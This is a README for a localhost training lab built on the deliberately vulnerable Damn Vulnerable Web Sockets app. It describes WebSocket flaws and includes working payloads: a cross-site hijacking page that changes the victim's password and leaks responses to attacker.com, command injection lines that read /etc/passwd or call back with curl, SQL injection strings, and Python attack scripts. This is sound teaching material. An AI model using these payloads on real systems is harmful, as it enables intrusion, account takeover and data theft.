# Damn Vulnerable Web Sockets (DVWS) Lab

## Overview

**DVWS (Damn Vulnerable Web Sockets)** is a vulnerable web application designed by TSS / tssoffsec and interference-security to demonstrate security vulnerabilities specific to the WebSocket protocol (RFC 6455).

Unlike traditional stateless HTTP request-response communication, WebSockets establish a persistent, bidirectional full-duplex TCP channel initiated via an HTTP `Upgrade` handshake. Because intermediate web application firewalls (WAFs), reverse proxies, and session management schemes often fail to inspect WebSocket frames, standard vulnerabilities (XSS, SQLi, Command Injection, CSRF) can manifest in non-traditional, stealthy ways.

- **Web Application URL**: `http://localhost:8102`
- **WebSocket Gateway URL**: `ws://localhost:8103`
- **Container Name**: `cyberlab_02_web_dvws`
- **Shortcut**: `./lab start dvws`
- **Directory**: `Classes/02_web_penetration_tester/15_websockets/dvws`

### Official Upstream Repositories & References

- **DVWS Upstream Repository (interference-security)**: [https://github.com/interference-security/DVWS](https://github.com/interference-security/DVWS)
- **DVWS Docker Source (tssoffsec)**: [https://github.com/tssoffsec/dvws](https://github.com/tssoffsec/dvws)
- **RFC 6455 (The WebSocket Protocol)**: [https://datatracker.ietf.org/doc/html/rfc6455](https://datatracker.ietf.org/doc/html/rfc6455)
- **PortSwigger WebSockets Security**: [https://portswigger.net/web-security/websockets](https://portswigger.net/web-security/websockets)

---

## Architecture & WebSocket Endpoints

DVWS runs Apache and PHP with a [Ratchet](https://github.com/ratchetphp/Ratchet) WebSocket server daemon listening on internal port `8080` (mapped to host port `8103`).

| Endpoint Route                        | Handler Class                     | Description / Vulnerability                                         |
| :------------------------------------ | :-------------------------------- | :------------------------------------------------------------------ |
| `/command-execution`                  | `CommandExecution`                | Command Injection & Blind Command Injection via `ping -c 3 <input>` |
| `/authenticate-user`                  | `AuthenticateUser`                | Error-based SQL Injection in Base64-encoded JSON                    |
| `/authenticate-user-blind`            | `AuthenticateUserBlind`           | Boolean / Time-based Blind SQL Injection in Base64 JSON             |
| `/authenticate-user-prepared`         | `AuthenticateUserPrepared`        | Parameterized SQL query implementation (Secure reference)           |
| `/authenticate-user-prepared-session` | `AuthenticateUserPreparedSession` | Session-aware authentication over WebSockets                        |
| `/change-password`                    | `ChangePassword`                  | Cross-Site WebSocket Hijacking (CSWSH) target                       |
| `/reflected-xss`                      | `ReflectedXSS`                    | Real-time reflected cross-site scripting                            |
| `/post-comments`                      | `PostComments`                    | Stored XSS via broadcasted WebSocket chat                           |
| `/show-comments`                      | `ShowComments`                    | Comment retrieval stream                                            |
| `/file-inclusion`                     | `FileInclusion`                   | Local File Inclusion (LFI) via WebSocket requests                   |

---

## Core Vulnerability Classes

### 1. Cross-Site WebSocket Hijacking (CSWSH)

The WebSocket specification does not enforce the Same-Origin Policy (SOP). The server is responsible for validating the `Origin` header during the HTTP Upgrade handshake. In DVWS, the Ratchet server sets `'allowedOrigins' => '*'`. Because browsers automatically attach ambient credentials (session cookies, HTTP Basic Auth) to cross-origin WebSocket handshakes, an attacker website can open a WebSocket connection to `ws://localhost:8103/change-password` or `/post-comments` on behalf of the victim and execute actions or exfiltrate private data.

### 2. WebSocket SQL Injection (Error-Based & Blind)

Input supplied inside WebSocket frames is parsed directly by backend PHP scripts without undergoing WAF inspection or sanitization.

- **Error-Based**: The `/authenticate-user` endpoint decodes Base64 inputs and concatenates them into `SELECT * FROM users where username='$auth_user' and password='$auth_pass'`. Database syntax errors and output rows are returned in the response frame.
- **Blind SQL Injection**: The `/authenticate-user-blind` endpoint does not echo verbose MySQL errors, but returns differential boolean responses (`Welcome to your account...` vs `Invalid username/password`) or accepts time delay injection (`admin' AND (SELECT SLEEP(5))=0 #`).

### 3. Blind & Direct Command Injection over WebSockets

The `/command-execution` endpoint executes OS commands via `shell_exec('ping -c 3 '.$msg)`.

- **Direct Injection**: Chaining shell commands (`127.0.0.1; whoami; id`) immediately reflects stdout in the response frame.
- **Blind Command Injection**: If responses are suppressed or decoupled asynchronously, payloads using time delays (`127.0.0.1; sleep 5`), out-of-band network callbacks (`127.0.0.1; curl http://attacker.com/$(whoami)`), or file redirects can be confirmed.

### 4. Unencrypted Communication (Plaintext `ws://` vs `wss://`)

By default, the lab transmits data using unencrypted WebSocket streams (`ws://`) over port 8103 without TLS encapsulation. Any passive adversary on the local network segment or inline network device can sniff unencrypted TCP stream packets, reconstruct full WebSocket frames, and extract sensitive payloads, user credentials, and session tokens in cleartext. In production, WebSockets must always enforce `wss://` (WebSocket Secure) over TLS.

---

## Hands-On Exploit Exercises

### Exercise 1: WebSocket Handshake & Origin Manipulation (CSWSH)

1. Verify the service is running:
   ```bash
   curl -i http://localhost:8102/
   ```
2. Run an HTTP handshake upgrade using `curl`:

   ```bash
   curl -i -N \
     -H "Connection: Upgrade" \
     -H "Upgrade: websocket" \
     -H "Sec-WebSocket-Version: 13" \
     -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
     -H "Origin: http://evil-attacker.com" \
     http://localhost:8103/command-execution
   ```

   **Expected Response**: `HTTP/1.1 101 Switching Protocols` with `X-Powered-By: Ratchet/0.3.5`, demonstrating that arbitrary external origins are accepted.

3. Proof-of-Concept Exploit HTML:
   Host an attacker page that automatically connects to the victim's local WebSocket endpoint:
   ```html
   <!DOCTYPE html>
   <html>
     <head>
       <title>CSWSH PoC</title>
     </head>
     <body>
       <h1>Cross-Site WebSocket Hijacking Proof of Concept</h1>
       <script>
         const ws = new WebSocket("ws://localhost:8103/change-password");
         ws.onopen = function () {
           // Exploit: Change password on behalf of authenticated victim
           ws.send(
             JSON.stringify({
               old_pass: "admin",
               new_pass: "hacked123",
             }),
           );
         };
         ws.onmessage = function (event) {
           fetch(
             "http://attacker.com/log?leak=" + encodeURIComponent(event.data),
           );
         };
       </script>
     </body>
   </html>
   ```

---

### Exercise 2: Testing with `wscat`

If `wscat` is installed (`npm install -g wscat`), connect directly to any endpoint:

#### Command Injection with `wscat`:

```bash
# Connect to the command execution endpoint
wscat -c ws://localhost:8103/command-execution

# Once connected, test standard ping:
> 127.0.0.1

# Exploit direct command injection:
> 127.0.0.1; whoami; id; uname -a

# Exploit blind command injection with sleep delay (5 second lag):
> 127.0.0.1; sleep 5
```

#### SQL Injection with `wscat`:

```bash
# Connect to authentication endpoint
wscat -c ws://localhost:8103/authenticate-user

# Send authentication payload:
# base64("admin' OR '1'='1") = YWRtaW4nIE9SICcxJz0nMQ==
# base64("password") = cGFzc3dvcmQ=
> {"auth_user": "YWRtaW4nIE9SICcxJz0nMQ==", "auth_pass": "cGFzc3dvcmQ="}

# Response received:
< <pre>Welcome to your account. How are you Super Administrator?</pre>
```

#### CSWSH Origin Spoofing with `wscat`:

```bash
wscat -c ws://localhost:8103/command-execution -H "Origin: https://malicious-site.example"
```

---

### Exercise 3: Python WebSocket Automation Scripts

No external dependencies are required when using Python standard library sockets, or you can use the `websockets` library.

#### Method A: Python Standard Library Socket (Zero Dependencies)

Save as `ws_exploit.py` and run with `python3 ws_exploit.py`:

```python
#!/usr/bin/env python3
import socket
import struct
import os
import json
import base64

def ws_handshake(sock, host, port, path, origin="http://evil.com"):
    req = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Upgrade: websocket\r\n"
        f"Connection: Upgrade\r\n"
        f"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
        f"Sec-WebSocket-Version: 13\r\n"
        f"Origin: {origin}\r\n\r\n"
    )
    sock.sendall(req.encode())
    resp = sock.recv(1024).decode(errors='replace')
    if "101 Switching Protocols" not in resp:
        raise ConnectionError(f"Handshake failed:\n{resp}")
    return resp

def send_ws_frame(sock, text):
    payload = text.encode('utf-8')
    length = len(payload)
    mask_key = os.urandom(4)
    frame = bytearray([0x81])  # FIN=1, Opcode=1 (Text)
    if length < 126:
        frame.append(0x80 | length)
    elif length < 65536:
        frame.append(0x80 | 126)
        frame.extend(struct.pack('>H', length))
    else:
        frame.append(0x80 | 127)
        frame.extend(struct.pack('>Q', length))
    frame.extend(mask_key)
    masked = bytearray(b ^ mask_key[i % 4] for i, b in enumerate(payload))
    frame.extend(masked)
    sock.sendall(frame)

def recv_ws_frame(sock):
    head = sock.recv(2)
    if not head or len(head) < 2:
        return ""
    b1, b2 = head
    masked = bool(b2 & 0x80)
    length = b2 & 0x7f
    if length == 126:
        length = struct.unpack('>H', sock.recv(2))[0]
    elif length == 127:
        length = struct.unpack('>Q', sock.recv(8))[0]
    mask = sock.recv(4) if masked else None
    data = b''
    while len(data) < length:
        chunk = sock.recv(length - len(data))
        if not chunk:
            break
        data += chunk
    if masked and mask:
        data = bytearray(b ^ mask[i % 4] for i, b in enumerate(data))
    return data.decode('utf-8', errors='replace')

# 1. Test Command Injection
s_cmd = socket.socket()
s_cmd.connect(('127.0.0.1', 8103))
ws_handshake(s_cmd, '127.0.0.1', 8103, '/command-execution')
print("[+] Testing Command Injection over WebSocket...")
send_ws_frame(s_cmd, '127.0.0.1; id; cat /etc/passwd | head -n 3')
print(recv_ws_frame(s_cmd))
s_cmd.close()

# 2. Test SQL Injection
s_sqli = socket.socket()
s_sqli.connect(('127.0.0.1', 8103))
ws_handshake(s_sqli, '127.0.0.1', 8103, '/authenticate-user')
print("[+] Testing SQL Injection over WebSocket...")
user_b64 = base64.b64encode(b"admin' OR '1'='1").decode()
pass_b64 = base64.b64encode(b"dummy").decode()
payload = json.dumps({'auth_user': user_b64, 'auth_pass': pass_b64})
send_ws_frame(s_sqli, payload)
print(recv_ws_frame(s_sqli))
s_sqli.close()
```

#### Method B: Using `websockets` Python Library

```python
import asyncio
import json
import base64
import websockets

async def test_dvws():
    uri = "ws://localhost:8103/authenticate-user"
    async with websockets.connect(uri, origin="http://evil.com") as ws:
        user_b64 = base64.b64encode(b"admin' OR '1'='1").decode()
        pass_b64 = base64.b64encode(b"whatever").decode()
        payload = json.dumps({"auth_user": user_b64, "auth_pass": pass_b64})
        await ws.send(payload)
        response = await ws.recv()
        print(f"Server response:\n{response}")

asyncio.run(test_dvws())
```

---

### Exercise 4: Burp Suite WebSocket Interception & Tampering

1. Access `http://localhost:8102` in a browser configured with Burp Suite (`127.0.0.1:8080`).
2. Go to **Proxy -> WebSockets history**.
3. All live WebSocket frames passing between the browser and `ws://localhost:8103/` are recorded.
4. Enable **Proxy -> Intercept -> Intercept WebSockets Messages**.
5. Trigger any action in DVWS (e.g. `brute-force.php`, `command-execution.php`, `csrf.php`).
6. Modify message contents or headers in Burp before forwarding to inspect real-time application behavior.

---

## YouTube Walkthroughs & Solving Guides

- [Manipulating WebSocket handshakes with Burp Suite](https://www.youtube.com/watch?v=NJ2TM4-id2w)
- [Manipulating WebSocket messages with Burp Suite](https://www.youtube.com/watch?v=Wcd1Lskvj4c)
- [How to test WebSockets with Burp Suite](https://www.youtube.com/watch?v=KbaOay1yOH0)
- [Lab: Cross-Site WebSocket Hijacking (CSWSH)](https://www.youtube.com/watch?v=U_z2OCAkoLk)
- [PortSwigger WebSockets: Manipulating WebSocket Messages](https://www.youtube.com/watch?v=DWnTxHpA61I)
- [Cross-Site WebSocket Hijacking (Technical Explanation)](https://www.youtube.com/watch?v=lrPPMDNpgdY)

---

## Quick CLI Control

From the `cyber_lab` root directory:

```bash
# Start DVWS
./lab start dvws

# Check running status
./lab status

# Enter container shell
./lab shell dvws

# Stop the lab
./lab stop dvws
```
